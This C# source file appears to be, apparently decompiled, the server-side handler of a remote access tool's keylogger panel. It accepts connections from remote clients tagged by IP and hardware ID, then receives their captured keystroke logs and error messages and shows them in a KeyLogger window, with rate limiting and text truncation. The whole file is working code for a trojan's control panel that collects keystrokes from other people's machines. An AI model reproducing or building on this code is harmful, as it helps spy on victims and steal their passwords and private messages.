using System;
using System.Collections.Concurrent;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerKeyLogger
{
	private const int MaxRichTextLength = 300000;

	private static readonly ConcurrentDictionary<string, int> _logCount = new ConcurrentDictionary<string, int>();

	private static readonly ConcurrentDictionary<string, DateTime> _logWindowStart = new ConcurrentDictionary<string, DateTime>();

	private const int MaxLogsPerSecond = 20;

	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string clientKey = client.IP + ":keylogger";
		DateTime now = DateTime.UtcNow;
		if (_logWindowStart.TryGetValue(clientKey, out var windowStart) && (now - windowStart).TotalSeconds < 1.0)
		{
			if (_logCount.AddOrUpdate(clientKey, 1, (string k, int v) => v + 1) > 20)
			{
				return;
			}
		}
		else
		{
			_logWindowStart[clientKey] = now;
			_logCount[clientKey] = 1;
		}
		string a = (string)objects[1];
		if (!(a == "Connect"))
		{
			if (!(a == "Error"))
			{
				if (!(a == "Log"))
				{
					return;
				}
				if (client.Tag == null)
				{
					client.Disconnect();
					return;
				}
				FormKeyLogger form = (FormKeyLogger)client.Tag;
				string logText = (string)objects[2];
				if (logText != null && logText.Length > 10000)
				{
					logText = logText.Substring(0, 10000) + "...";
				}
				form.Invoke((MethodInvoker)delegate
				{
					if (form.richTextBox1.Text.Length > 300000)
					{
						form.richTextBox1.Text = form.richTextBox1.Text.Substring(form.richTextBox1.Text.Length - 150000);
					}
					form.richTextBox1.Text += logText;
					form.richTextBox1.SelectionStart = form.richTextBox1.Text.Length;
					form.richTextBox1.ScrollToCaret();
				});
				return;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormKeyLogger form2 = (FormKeyLogger)client.Tag;
			string errorMsg = (string)objects[2];
			if (errorMsg != null && errorMsg.Length > 5000)
			{
				errorMsg = errorMsg.Substring(0, 5000) + "...";
			}
			form2.Invoke((MethodInvoker)delegate
			{
				if (form2.richTextBox1.Text.Length > 300000)
				{
					form2.richTextBox1.Text = form2.richTextBox1.Text.Substring(form2.richTextBox1.Text.Length - 150000);
				}
				RichTextBox richTextBox = form2.richTextBox1;
				richTextBox.Text = richTextBox.Text + "Error: " + errorMsg + "\n";
			});
			return;
		}
		FormKeyLogger form3 = (FormKeyLogger)Application.OpenForms["KeyLogger:" + (string)objects[2]];
		if (form3 == null)
		{
			client.Disconnect();
			return;
		}
		form3.Invoke((MethodInvoker)delegate
		{
			form3.Text = "KeyLogger [" + (string)objects[2] + "]";
			form3.client = client;
			form3.richTextBox1.Enabled = true;
		});
		client.Tag = form3;
		client.Hwid = (string)objects[2];
	}
}
